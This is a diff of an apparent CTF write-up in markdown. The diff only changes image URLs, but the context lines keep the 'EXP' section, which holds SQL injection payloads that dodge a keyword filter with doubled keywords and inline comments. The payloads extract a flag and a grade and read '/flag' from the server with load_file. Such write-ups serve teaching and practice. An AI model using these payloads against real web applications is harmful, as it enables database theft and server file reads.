@@ -8,7 +8,7 @@ date: 2024-2-3
 
 ## info
 
-![img](https://x1lys.github.io/blog/src/assets/img/7-1-1.png)
+![img](https://x1lys.github.io/X1lyS.blog.github.io/src/assets/img/7-1-1.png)
 
 ## EXP
 
@@ -16,19 +16,19 @@ date: 2024-2-3
 ?user=1'/**/union/**/seselectlect/**/flag/**/frofromm/**/secret.passwoorrd%23
 ```
 
-![img](https://x1lys.github.io/blog/src/assets/img/7-1-2.png)
+![img](https://x1lys.github.io/X1lyS.blog.github.io/src/assets/img/7-1-2.png)
 
 ```cpp
 ?user=1'/**/union/**/seselectlect/**/grade/**/frofromm/**/scoorre/**/where/**/student/**/like/**/'begin'%23
 ```
 
-![img](https://x1lys.github.io/blog/src/assets/img/7-1-3.png)
+![img](https://x1lys.github.io/X1lyS.blog.github.io/src/assets/img/7-1-3.png)
 
 ```cpp
 ?user=1'/**/union/**/seleselectct/**/loaloadd_file('/flag')%23
 ```
 
-![img](https://x1lys.github.io/blog/src/assets/img/7-1-4.png)
+![img](https://x1lys.github.io/X1lyS.blog.github.io/src/assets/img/7-1-4.png)
 
 ## Summary
 
